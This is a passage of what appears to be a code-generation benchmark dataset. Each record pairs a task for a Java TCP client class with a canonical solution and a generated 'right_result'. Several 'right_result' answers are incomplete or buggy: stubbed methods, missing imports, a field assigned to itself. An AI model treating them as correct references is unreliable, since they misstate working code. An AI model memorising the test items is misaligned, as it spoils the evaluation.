}\n\n        String nextLine() {\n            try {\n                return stream.readUTF();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            return \"\";\n        }\n    }\n\n    private class Writer {\n        DataOutputStream stream;\n\n        Writer(OutputStream stream) {\n            this.stream = new DataOutputStream(stream);\n        }\n\n        void println(String text) {\n            try {\n                stream.writeUTF(text);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void complete() {\n        String done = reader.nextLine();\n        if (!done.equals(\"DONE\")) {\n            System.out.println(\"WTF!!\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport javax.imageio.ImageIO;\nimport java.awt.image.BufferedImage;\n\npublic class DeviceConnection {\n    private Socket socket;\n    private Reader reader;\n    private Writer writer;\n    private static final boolean USE_ZIP = true;\n\n    public DeviceConnection() throws IOException {\n        socket = new Socket(\"localhost\", 4242);\n        reader = new Reader(socket.getInputStream());\n        writer = new Writer(socket.getOutputStream());\n    }\n\n    public void close() throws IOException {\n        reader.close();\n        writer.close();\n        socket.close();\n    }\n\n    public ArrayList<String> listLayoutFiles() throws IOException {\n        writer.println(\"LIST_FILES\");\n        return reader.readLines();\n    }\n\n    public BufferedImage takePicture() throws IOException {\n        writer.println(\"TAKE_PICTURE\");\n        if (USE_ZIP) {\n            // Implement ZIP decompression logic here\n            // For simplicity, assume this method is implemented elsewhere\n            return null; // Placeholder\n        } else {\n            return ImageIO.read(reader.getInputStream());\n        }\n    }\n\n    public void complete() throws IOException {\n        writer.println(\"COMPLETE\");\n        reader.nextLine(); // Wait for confirmation\n    }\n\n    private class Reader extends BufferedReader {\n        public Reader(InputStream in) {\n            super(new InputStreamReader(in));\n        }\n\n        public ArrayList<String> readLines() throws IOException {\n            ArrayList<String> lines = new ArrayList<>();\n            String line;\n            while ((line = readLine()) != null) {\n                lines.add(line);\n            }\n            return lines;\n        }\n    }\n\n    private class Writer extends PrintWriter {\n        public Writer(OutputStream out) {\n            super(new OutputStreamWriter(out), true);\n        }\n\n        public void println(String s) {\n            write(s + \"\\n\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 411,
    "Instruction": "Task Description: Implement a TCP client class in Java that establishes a connection to a server, handles bidirectional communication using object serialization, and manages various types of data frames for benchmarking purposes.\n\nClass Description: BinaryLinkClient is a TCP client implementation that connects to a benchmarking server, exchanging serialized data frames for coordinating benchmark execution, handling results, and managing output streams. It features thread-safe frame pushing, error handling, and resource management.\n\nAttributes:\n- lock: Object - Synchronization object for thread safety\n- clientSocket: Socket - TCP socket connection to the server\n- oos: ObjectOutputStream - Output stream for sending serialized objects\n- ois: ObjectInputStream - Input stream for receiving serialized objects\n- streamErr: ForwardingPrintStream - Error output stream that forwards to server\n- streamOut: ForwardingPrintStream - Standard output stream that forwards to server\n- outputFormat: OutputFormat - Proxy for formatting output frames\n- failed: boolean - Flag indicating connection failure state\n- resetToGo: int - Counter for periodic stream resets\n- delayedFrames: List<Serializable> - Buffer for frames during nested pushes\n- inFrame: boolean - Flag indicating ongoing frame transmission\n\nMethods:\n- BinaryLinkClient(String hostName, int hostPort) -> void - Constructor establishing connection to specified host:port\n- pushFrame(Serializable frame) -> void - Thread-safe method to send a serializable frame to server\n- readFrame() -> Object - Reads and returns the next frame from server\n- close() -> void - Closes all connections and streams\n- handshake() -> Options - Performs initial handshake with server, returns benchmark options\n- requestPlan() -> ActionPlan - Requests benchmark action plan from server\n- pushResults(IterationResult res) -> void - Sends benchmark results to server\n- pushException(BenchmarkException error) -> void - Sends benchmark exception to server\n- pushResultMetadata(BenchmarkResultMetaData res) -> void - Sends result metadata to server\n- getOutStream() -> PrintStream - Returns standard output stream\n- getErrStream() -> PrintStream - Returns error output stream\n- getOutputFormat() -> OutputFormat - Returns output format proxy\n\nInner Class:\n- ForwardingPrintStream - Custom PrintStream that forwards output to server as frames",
    "Canonical_solution": "import org.openjdk.jmh.runner.link.*;\nimport org.openjdk.jmh.runner.ActionPlan;\nimport org.openjdk.jmh.runner.BenchmarkException;\nimport org.openjdk.jmh.runner.format.OutputFormat;\nimport org.openjdk.jmh.runner.options.Options;\nimport org.openjdk.jmh.util.FileUtils;\nimport org.openjdk.jmh.util.Utils;\n\nimport java.io.*;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic final class BinaryLinkClient {\n\n    private static final int RESET_EACH = Integer.getInteger(\"jmh.link.resetEach\", 100);\n    private static final int BUFFER_SIZE = Integer.getInteger(\"jmh.link.bufferSize\", 64*1024);\n\n    private final Object lock;\n    private final Socket clientSocket;\n    private final ObjectOutputStream oos;\n    private final ObjectInputStream ois;\n    private final ForwardingPrintStream streamErr;\n    private final ForwardingPrintStream streamOut;\n    private final OutputFormat outputFormat;\n    private volatile boolean failed;\n    private int resetToGo;\n    private final List<Serializable> delayedFrames;\n    private boolean inFrame;\n\n    public BinaryLinkClient(String hostName, int hostPort) throws IOException {\n        this.lock = new Object();\n        this.clientSocket = new Socket(hostName, hostPort);\n        this.oos = new ObjectOutputStream(new BufferedOutputStream(clientSocket.getOutputStream(), BUFFER_SIZE));\n        this.oos.flush();\n        this.ois = new ObjectInputStream(new BufferedInputStream(clientSocket.getInputStream(), BUFFER_SIZE));\n        this.streamErr = new ForwardingPrintStream(OutputFrame.Type.ERR);\n        this.streamOut = new ForwardingPrintStream(OutputFrame.Type.OUT);\n        this.outputFormat = (OutputFormat) Proxy.newProxyInstance(\n                Thread.currentThread().getContextClassLoader(),\n                new Class[]{OutputFormat.class},\n                (proxy, method, args) -> {\n                    pushFrame(new OutputFormatFrame(ClassConventions.getMethodName(method), args));\n                    return null;\n                }\n        );\n        this.delayedFrames = new ArrayList<>();\n    }\n\n    private void pushFrame(Serializable frame) throws IOException {\n        if (failed) {\n            throw new IOException(\"Link had failed already\");\n        }\n\n        synchronized (lock) {\n            if (inFrame) {\n                delayedFrames.add(frame);\n                return;\n            }\n\n            try {\n                inFrame = true;\n\n                if (resetToGo-- < 0) {\n                    oos.reset();\n                    resetToGo = RESET_EACH;\n                }\n\n                oos.writeObject(frame);\n                oos.flush();\n\n                while (!delayedFrames.isEmpty()) {\n                    List<Serializable> frames = new ArrayList<>(delayedFrames);\n                    delayedFrames.clear();\n                    for (Serializable f : frames) {\n                        oos.writeObject(f);\n                    }\n                    oos.flush();\n                }\n            } catch (IOException e) {\n                failed = true;\n                throw e;\n            } finally {\n                inFrame = false;\n            }\n        }\n    }\n\n    private Object readFrame() throws IOException, ClassNotFoundException {\n        try {\n            return ois.readObject();\n        } catch (ClassNotFoundException | IOException ex) {\n            failed = true;\n            throw ex;\n        }\n    }\n\n    public void close() throws IOException {\n        FileUtils.safelyClose(streamErr);\n        FileUtils.safelyClose(streamOut);\n\n        synchronized (lock) {\n            oos.writeObject(new FinishingFrame());\n            FileUtils.safelyClose(ois);\n            FileUtils.safelyClose(oos);\n            clientSocket.close();\n        }\n    }\n\n    public Options handshake() throws IOException, ClassNotFoundException {\n        synchronized (lock) {\n            pushFrame(new HandshakeInitFrame(Utils.getPid()));\n            Object reply = readFrame();\n            if (reply instanceof HandshakeResponseFrame) {\n                return (((HandshakeResponseFrame) reply).getOpts());\n            } else {\n                throw new IllegalStateException(\"Got the erroneous reply: \" + reply);\n            }\n        }\n    }\n\n    public ActionPlan requestPlan() throws IOException, ClassNotFoundException {\n        synchronized (lock) {\n            pushFrame(new InfraFrame(InfraFrame.Type.ACTION_PLAN_REQUEST));\n            Object reply = readFrame();\n            if (reply instanceof ActionPlanFrame) {\n                return ((ActionPlanFrame) reply).getActionPlan();\n            } else {\n                throw new IllegalStateException(\"Got the erroneous reply: \" + reply);\n            }\n        }\n    }\n\n    public void pushResults(IterationResult res) throws IOException {\n        pushFrame(new ResultsFrame(res));\n    }\n\n    public void pushException(BenchmarkException error) throws IOException {\n        pushFrame(new ExceptionFrame(error));\n    }\n\n    public void pushResultMetadata(BenchmarkResultMetaData res) throws IOException {\n        pushFrame(new ResultMetadataFrame(res));\n    }\n\n    public PrintStream getOutStream() {\n        return streamOut;\n    }\n\n    public PrintStream getErrStream() {\n        return streamErr;\n    }\n\n    public OutputFormat getOutputFormat() {\n        return outputFormat;\n    }\n\n    class ForwardingPrintStream extends PrintStream {\n        public ForwardingPrintStream(final OutputFrame.Type type) {\n            super(new OutputStream() {\n                @Override\n                public void write(int b) throws IOException {\n                    pushFrame(new OutputFrame(type, new byte[]{(byte) (b & 0xFF)}));\n                }\n\n                @Override\n                public void write(byte[] b) throws IOException {\n                    pushFrame(new OutputFrame(type, Arrays.copyOf(b, b.length)));\n                }\n\n                @Override\n                public void write(byte[] b, int off, int len) throws IOException {\n                    pushFrame(new OutputFrame(type, Arrays.copyOfRange(b, off, len + off)));\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.Socket;\nimport java.util.*;\n\npublic class BinaryLinkClient {\n    private final Object lock = new Object();\n    private Socket clientSocket;\n    private ObjectOutputStream oos;\n    private ObjectInputStream ois;\n    private ForwardingPrintStream streamErr;\n    private ForwardingPrintStream streamOut;\n    private OutputFormat outputFormat;\n    private boolean failed = false;\n    private int resetToGo = 0;\n    private List<Serializable> delayedFrames = new ArrayList<>();\n    private boolean inFrame = false;\n\n    public BinaryLinkClient(String hostName, int hostPort) throws IOException {\n        clientSocket = new Socket(hostName, hostPort);\n        oos = new ObjectOutputStream(clientSocket.getOutputStream());\n        ois = new ObjectInputStream(clientSocket.getInputStream());\n        streamErr = new ForwardingPrintStream(oos);\n        streamOut = new ForwardingPrintStream(oos);\n        outputFormat = new OutputFormat();\n    }\n\n    public synchronized void pushFrame(Serializable frame) throws IOException {\n        if (!inFrame) {\n            oos.writeObject(frame);\n        } else {\n            delayedFrames.add(frame);\n        }\n    }\n\n    public Object readFrame() throws IOException, ClassNotFoundException {\n        return ois.readObject();\n    }\n\n    public void close() throws IOException {\n        oos.close();\n        ois.close();\n        clientSocket.close();\n    }\n\n    public Options handshake() throws IOException, ClassNotFoundException {\n        oos.writeObject(\"HANDSHAKE\");\n        return (Options) ois.readObject();\n    }\n\n    public ActionPlan requestPlan() throws IOException, ClassNotFoundException {\n        oos.writeObject(\"REQUEST_PLAN\");\n        return (ActionPlan) ois.readObject();\n    }\n\n    public void pushResults(IterationResult res) throws IOException {\n        oos.writeObject(res);\n    }\n\n    public void pushException(BenchmarkException error) throws IOException {\n        oos.writeObject(error);\n    }\n\n    public void pushResultMetadata(BenchmarkResultMetaData res) throws IOException {\n        oos.writeObject(res);\n    }\n\n    public PrintStream getOutStream() {\n        return streamOut;\n    }\n\n    public PrintStream getErrStream() {\n        return streamErr;\n    }\n\n    public OutputFormat getOutputFormat() {\n        return outputFormat;\n    }\n\n    private static class ForwardingPrintStream extends PrintStream {\n        private ObjectOutputStream oos;\n\n        public ForwardingPrintStream(ObjectOutputStream oos) {\n            super(new ByteArrayOutputStream(), true);\n            this.oos = oos;\n        }\n\n        @Override\n        public void write(int b) {\n            super.write(b);\n        }\n\n        @Override\n        public void flush() {\n            try {\n                oos.writeObject(this.toString());\n                this.reset();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 414,
    "Instruction": "Task Description: Create a Java class that handles TCP socket communication for receiving screen data from an Android device via minicap and forwarding it to a data queue for processing.\n\nClass Description: MiniCapInputSocketThread is a thread class that establishes a TCP connection to a local port forwarded from an Android device, continuously reads screen data from the minicap service, and places the data into a blocking queue for further processing by other components. It also manages resource cleanup when the connection is terminated.\n\nAttributes:\n- log: Logger - Logger instance for logging debug and status information\n- iDevice: IDevice - The Android device being monitored\n- dataQueue: BlockingQueue<byte[]> - Queue for storing received screen data\n- miniCapPro: MiniCapLocalThread - The parent minicap process thread\n- androidTestTaskBootThread: AndroidTestTaskBootThread - The main Android test task thread\n- session: Session - WebSocket session associated with the screen streaming\n\nMethods:\n- MiniCapInputSocketThread(IDevice, BlockingQueue<byte[]>, MiniCapLocalThread, Session) -> None - Constructor that initializes the thread with device, data queue, minicap process, and session references\n- run() -> None - Main thread execution that establishes the socket connection, reads data continuously, and handles cleanup when finished",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport jakarta.websocket.Session;\nimport org.cloud.sonic.agent.bridge.android.AndroidDeviceBridgeTool;\nimport org.cloud.sonic.agent.common.maps.ScreenMap;\nimport org.cloud.sonic.agent.tests.android.AndroidTestTaskBootThread;\nimport org.cloud.sonic.agent.tools.PortTool;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\n\nimport static org.cloud.sonic.agent.tools.BytesTool.subByteArray;\n\npublic class MiniCapInputSocketThread extends Thread {\n\n    private final Logger log = LoggerFactory.getLogger(MiniCapInputSocketThread.class);\n\n    public final static String ANDROID_INPUT_SOCKET_PRE = \"android-minicap-input-socket-task-%s-%s-%s\";\n\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private MiniCapLocalThread miniCapPro;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.session = session;\n        this.androidTestTaskBootThread = miniCapPro.getAndroidTestTaskBootThread();\n        this.setDaemon(false);\n        this.setName(androidTestTaskBootThread.formatThreadName(ANDROID_INPUT_SOCKET_PRE));\n    }\n\n    @Override\n    public void run() {\n        int finalMiniCapPort = PortTool.getPort();\n        AndroidDeviceBridgeTool.forward(iDevice, finalMiniCapPort, \"minicap\");\n        Socket capSocket = null;\n        InputStream inputStream = null;\n        try {\n            capSocket = new Socket(\"localhost\", finalMiniCapPort);\n            inputStream = capSocket.getInputStream();\n            int len = 1024;\n            while (miniCapPro.isAlive()) {\n                byte[] buffer = new byte[len];\n                int realLen;\n                realLen = inputStream.read(buffer);\n                if (buffer.length != realLen && realLen >= 0) {\n                    buffer = subByteArray(buffer, 0, realLen);\n                }\n                if (realLen >= 0) {\n                    dataQueue.offer(buffer);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (miniCapPro.isAlive()) {\n                miniCapPro.interrupt();\n                log.info(\"miniCap thread closed.\");\n            }\n            if (capSocket != null && capSocket.isConnected()) {\n                try {\n                    capSocket.close();\n                    log.info(\"miniCap socket closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (inputStream != null) {\n                try {\n                    inputStream.close();\n                    log.info(\"miniCap input stream closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        AndroidDeviceBridgeTool.removeForward(iDevice, finalMiniCapPort, \"minicap\");\n        if (session != null) {\n            ScreenMap.getMap().remove(session);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\n\npublic class MiniCapInputSocketThread extends Thread {\n    private static final Logger log = Logger.getLogger(MiniCapInputSocketThread.class.getName());\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private MiniCapLocalThread miniCapPro;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.androidTestTaskBootThread = androidTestTaskBootThread;\n        this.session = session;\n    }\n\n    @Override\n    public void run() {\n        try (Socket socket = new Socket(\"localhost\", 13131)) {\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = socket.getInputStream().read(buffer)) != -1) {\n                dataQueue.put(Arrays.copyOfRange(buffer, 0, bytesRead));\n            }\n        } catch (IOException | InterruptedException e) {\n            log.severe(\"Error reading from socket: \" + e.getMessage());\n        } finally {\n            miniCapPro.stop();\n            androidTestTaskBootThread.interrupt();\n            try {\n                session.close();\n            } catch (IOException e) {\n                log.severe(\"Error closing WebSocket session: \" + e.getMessage());\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 418,
    "Instruction": "Task Description: Implement a Java class for handling Protocol Buffers (protobuf) communication over TCP sockets, including message sending, receiving, and callback management for different response types (error, warning, info, success).\n\nClass Description: ProtobufIO is a TCP client implementation that facilitates bidirectional protobuf message exchange with a server. It handles message serialization/deserialization, connection management, and provides callback mechanisms for processing server responses.\n\nAttributes:\n\nsock: [Socket] - TCP socket connection to the server\ninputStream: [InputStream] - Input stream for reading data from the server\noutputStream: [OutputStream] - Output stream for writing data to the server\nthread: [Thread] - Worker thread for handling incoming messages\nshutdown: [boolean] - Flag indicating whether the connection should be terminated\noutStream: [PrintStream] - Output stream for logging/debugging\ncallbacks: [List<MessageCallback>] - Registered callback handlers for server responses\napiCallIdGen: [AtomicLong] - Generator for unique API call IDs\nCALLBACK_LOCK: [Object] - Synchronization object for callback operations\n\nMethods:\n\nProtobufIO: [Constructor](String host, int port, PrintStream out, String threadName) -> [void] - Initializes TCP connection to specified host:port and starts worker thread\nsend: [long](String apiCall, MessageLite msg) -> [long] - Sends a protobuf message with auto-generated API call ID\nsend: [long](long apiCallIdRef, String apiCallRef, MessageLite... messages) -> [long] - Sends one or more protobuf messages with specified API call ID\nsend: [void](byte[] data) -> [void] - Sends raw byte data with length header\nregisterCallback: [void](MessageCallback callback) -> [void] - Registers a callback handler for server responses\nunregisterCallback: [void](MessageCallback callback) -> [void] - Unregisters a callback handler\ngetNextApiCallId: [long]() -> [long] - Generates and returns a new unique API call ID\nshutdown: [void]() -> [void] - Closes the connection and stops the worker thread\ncallback: [void](long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap) -> [void] - Internal method to dispatch callbacks based on response type\nProtobufIOWorker.run: [void]() -> [void] - Worker thread implementation for reading and processing incoming messages (inner class)",
    "Canonical_solution": "import com.linbit.linstor.api.ApiConsts;\nimport com.linbit.linstor.api.ApiRcUtils;\nimport com.linbit.linstor.proto.MsgHeaderOuterClass.MsgHeader;\nimport com.linbit.linstor.proto.common.ApiCallResponseOuterClass.ApiCallResponse;\n\nimport static com.linbit.linstor.api.ApiConsts.MASK_ERROR;\nimport static com.linbit.linstor.api.ApiConsts.MASK_INFO;\nimport static com.linbit.linstor.api.ApiConsts.MASK_WARN;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.concurrent.atomic.AtomicLong;\n\nimport com.google.protobuf.MessageLite;\n\npublic class ProtobufIO\n{\n    public static final Object CALLBACK_LOCK = new Object();\n\n    public interface MessageCallback\n    {\n        void error(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void warn(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void info(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void success(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n    }\n\n    protected Socket sock;\n    protected InputStream inputStream;\n    protected OutputStream outputStream;\n\n    protected Thread thread;\n    protected boolean shutdown;\n\n    private PrintStream outStream;\n    private List<MessageCallback> callbacks = new ArrayList<>();\n    protected AtomicLong apiCallIdGen = new AtomicLong(0);\n\n    public ProtobufIO(\n        String host,\n        int port,\n        PrintStream out,\n        String threadName\n    )\n        throws UnknownHostException, IOException\n    {\n        outStream = out;\n        sock = new Socket(host, port);\n        inputStream = sock.getInputStream();\n        outputStream = sock.getOutputStream();\n\n        shutdown = false;\n        thread = new Thread(new ProtobufIOWorker(), threadName);\n        thread.start();\n    }\n\n    public long send(String apiCall, MessageLite msg) throws IOException\n    {\n        return send(\n            getNextApiCallId(),\n            apiCall,\n            msg\n        );\n    }\n\n    public long send(long apiCallIdRef, String apiCallRef, MessageLite... messages) throws IOException\n    {\n        MsgHeader headerMsg = MsgHeader.newBuilder()\n            .setMsgType(MsgHeader.MsgType.API_CALL)\n            .setMsgContent(apiCallRef)\n            .setApiCallId(apiCallIdRef)\n            .build();\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        headerMsg.writeDelimitedTo(baos);\n\n        for (MessageLite msg : messages)\n        {\n            msg.writeDelimitedTo(baos);\n        }\n        byte[] protoData = baos.toByteArray();\n        baos.close();\n\n        send(protoData);\n\n        return apiCallIdRef;\n    }\n\n    public void send(byte[] data) throws IOException\n    {\n        byte[] header = new byte[16];\n        ByteBuffer byteBuffer = ByteBuffer.wrap(header);\n        byteBuffer.putInt(0, 0);\n        byteBuffer.putInt(4, data.length);\n\n        outputStream.write(header);\n        outputStream.write(data);\n    }\n\n    public void registerCallback(MessageCallback callback)\n    {\n        callbacks.add(callback);\n    }\n\n    public void unregisterCallback(MessageCallback callback)\n    {\n        callbacks.remove(callback);\n    }\n\n    public long getNextApiCallId()\n    {\n        return apiCallIdGen.incrementAndGet();\n    }\n\n    public void shutdown() throws IOException\n    {\n        shutdown = true;\n        sock.close();\n        thread.interrupt();\n    }\n\n    private class ProtobufIOWorker implements Runnable\n    {\n        @Override\n        public void run()\n        {\n            StringBuilder sb = new StringBuilder();\n            byte[] header = new byte[16];\n            int read;\n            int offset = 0;\n            int protoLen;\n            while (!shutdown)\n            {\n                try\n                {\n                    offset = 0;\n                    while (offset != header.length)\n                    {\n                        read = inputStream.read(header, offset, header.length - offset);\n                        if (read == -1)\n                        {\n                            return;\n                        }\n                        offset += read;\n                    }\n\n                    protoLen = (header[4] & 0xFF) << 24 |\n                               (header[5] & 0xFF) << 16 |\n                               (header[6] & 0xFF) << 8  |\n                               (header[7] & 0xFF);\n                    offset = 0;\n                    byte[] data = new byte[protoLen];\n\n                    while (offset != protoLen)\n                    {\n                        read = inputStream.read(data, offset, protoLen - offset);\n                        if (read == -1)\n                        {\n                            return;\n                        }\n                        offset += read;\n                    }\n\n                    ByteArrayInputStream bais = new ByteArrayInputStream(data);\n                    MsgHeader protoHeader = MsgHeader.parseDelimitedFrom(bais);\n\n                    sb.setLength(0);\n                    int responseIdx = 1;\n\n                    String apiCall = protoHeader.getMsgContent();\n                    if (bais.available() == 0)\n                    {\n                        sb.append(\"ApiCallId: \")\n                            .append(protoHeader.getApiCallId())\n                            .append(\"\\n\")\n                            .append(apiCall)\n                            .append(\"\\n\");\n                    }\n                    if (!apiCall.equals(ApiConsts.API_VERSION))\n                    {\n                        while (bais.available() > 0)\n                        {\n                            ApiCallResponse response = ApiCallResponse.parseDelimitedFrom(bais);\n                            long retCode = response.getRetCode();\n                            String message = response.getMessage();\n                            String cause = response.getCause();\n                            String correction = response.getCorrection();\n                            String details = response.getDetails();\n                            Map<String, String> objRefsMap = response.getObjRefsMap();\n\n                            callback(protoHeader.getApiCallId(), retCode, message, cause, correction,\n                                details, objRefsMap);\n                        }\n                    }\n                }\n                catch (IOException ioExc)\n                {\n                    if (!shutdown)\n                    {\n                        ioExc.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.Socket;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class ProtobufIO {\n    private Socket sock;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n    private Thread thread;\n    private boolean shutdown;\n    private PrintStream outStream;\n    private List<MessageCallback> callbacks;\n    private AtomicLong apiCallIdGen = new AtomicLong();\n    private static final Object CALLBACK_LOCK = new Object();\n\n    public ProtobufIO(String host, int port, PrintStream out, String threadName) throws IOException {\n        this.sock = new Socket(host, port);\n        this.inputStream = sock.getInputStream();\n        this.outputStream = sock.getOutputStream();\n        this.shutdown = false;\n        this.outStream = out;\n        this.callbacks = new ArrayList<>();\n        this.thread = new Thread(new ProtobufIOWorker(), threadName);\n        this.thread.start();\n    }\n\n    public long send(String apiCall, MessageLite msg) throws IOException {\n        return send(apiCallIdGen.incrementAndGet(), apiCall, msg);\n    }\n\n    public long send(long apiCallIdRef, String apiCallRef, MessageLite... messages) throws IOException {\n        // Serialize and send messages\n        // ...\n        return apiCallIdRef;\n    }\n\n    public void send(byte[] data) throws IOException {\n        // Send raw byte data with length header\n        // ...\n    }\n\n    public void registerCallback(MessageCallback callback) {\n        synchronized (CALLBACK_LOCK) {\n            callbacks.add(callback);\n        }\n    }\n\n    public void unregisterCallback(MessageCallback callback) {\n        synchronized (CALLBACK_LOCK) {\n            callbacks.remove(callback);\n        }\n    }\n\n    public long getNextApiCallId() {\n        return apiCallIdGen.incrementAndGet();\n    }\n\n    public void shutdown() {\n        try {\n            shutdown = true;\n            if (sock != null) {\n                sock.close();\n            }\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (outputStream != null) {\n                outputStream.close();\n            }\n            if (thread != null) {\n                thread.join();\n            }\n        } catch (IOException | InterruptedException e) {\n            outStream.println(\"Error during shutdown: \" + e.getMessage());\n        }\n    }\n\n    private void callback(long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap) {\n        synchronized (CALLBACK_LOCK) {\n            for (MessageCallback callback : callbacks) {\n                callback.handle(apiCallId, retCode, message, cause, correction, details, objRefsMap);\n            }\n        }\n    }\n\n    private class ProtobufIOWorker implements Runnable {\n        @Override\n        public void run() {\n            while (!shutdown) {\n                try {\n                    // Read and process incoming messages\n                    // ...\n                } catch (IOException e) {\n                    outStream.println(\"Error reading from socket: \" + e.getMessage());\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 419,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for voice communication, handling both input and output streams for audio data transmission.\n\nClass Description: The VoiceClient class extends Thread to create a TCP client that connects to a voice server. It manages audio stream connections, handles data transmission, and provides methods for connection management.\n\nAttributes:\n- format: AudioFormat - The audio format configuration for the voice data\n- outputThread: VoiceOutput - Thread handling outgoing voice data\n- inputThread: VoiceInput - Thread handling incoming voice data\n- output: DataOutputStream - Output stream for sending data to server\n- input: DataInputStream - Input stream for receiving data from server\n- running: boolean - Flag indicating if the client is active\n- socket: Socket - The TCP socket connection\n- ip: String - The IP address of the server to connect to\n\nMethods:\n- VoiceClient(String ip) -> None - Constructor that initializes the client with server IP\n- run() -> None - Main thread method that establishes connection and starts I/O threads\n- disconnect() -> None - Closes all connections and stops the client\n- isRunning() -> boolean - Returns the running status of the client\n- getOutputStream() -> DataOutputStream - Returns the output stream\n- getInputStream() -> DataInputStream - Returns the input stream\n- getAudioFormat() -> AudioFormat - Returns the audio format configuration",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.ConnectException;\nimport java.net.Socket;\nimport javax.sound.sampled.AudioFormat;\n\npublic class VoiceClient extends Thread {\n\n    private final AudioFormat format = new AudioFormat(16_000F, 16, 1, true, true);\n    private VoiceOutput outputThread;\n    private VoiceInput inputThread;\n    private DataOutputStream output;\n    private DataInputStream input;\n    private boolean running;\n    private Socket socket;\n    private final String ip;\n\n    public VoiceClient(String ip) {\n        super(\"VoiceServer Client Thread \" + ip);\n        this.ip = ip;\n        setDaemon(true);\n    }\n\n    @Override\n    public void run() {\n        try {\n            socket = new Socket(ip, MekanismAdditionsConfig.additions.voicePort.get());\n            running = true;\n\n            input = new DataInputStream(new BufferedInputStream(socket.getInputStream()));\n            output = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));\n\n            (outputThread = new VoiceOutput(this)).start();\n            (inputThread = new VoiceInput(this)).start();\n        } catch (ConnectException e) {\n        } catch (Exception e) {\n        }\n    }\n\n    public void disconnect() {\n        try {\n            if (inputThread != null) {\n                inputThread.interrupt();\n                inputThread.close();\n            }\n            if (outputThread != null) {\n                outputThread.interrupt();\n                outputThread.close();\n            }\n            if (output != null) {\n                output.close();\n            }\n            if (input != null) {\n                input.close();\n            }\n            if (socket != null) {\n                socket.close();\n            }\n\n            interrupt();\n\n            running = false;\n        } catch (Exception e) {\n        }\n    }\n\n    public boolean isRunning() {\n        return running;\n    }\n\n    public DataOutputStream getOutputStream() {\n        return output;\n    }\n\n    public DataInputStream getInputStream() {\n        return input;\n    }\n\n    public AudioFormat getAudioFormat() {\n        return format;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
